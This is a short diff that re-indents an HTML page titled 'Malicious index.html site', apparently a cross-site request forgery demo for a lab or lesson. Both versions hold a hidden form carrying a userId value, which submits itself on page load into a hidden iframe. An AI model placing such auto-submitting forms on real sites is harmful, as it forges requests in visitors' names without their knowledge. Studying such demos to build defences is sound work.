@@ -1,9 +1,13 @@
-<head>
-    <title>Malicious index.html site</title>
-</head>
-<body onload="document.csrfForm.submit()">
-    <form action="index.html" method="POST" name="csrfForm" style="display: none;" target="hidden_results" >
-        <input type="text" name="userId" value="a6ec3d2901acdbd80ec36e103327409499ea3a04" />
-    </form>
-    <iframe name="hidden_results" style=display: none;"></iframe>
-</body>
+<html>
+    <head>
+        <title>Malicious index.html site</title>
+    </head>
+
+    <body onload="document.csrfForm.submit()">
+        <form action="index.html" method="POST" name="csrfForm" style="display: none;" target="hidden_results" >
+            <input type="text" name="userId" value="a6ec3d2901acdbd80ec36e103327409499ea3a04" />
+        </form>
+        <iframe name="hidden_results" style=display: none;"></iframe>
+    </body>
+</html>
+                                                           
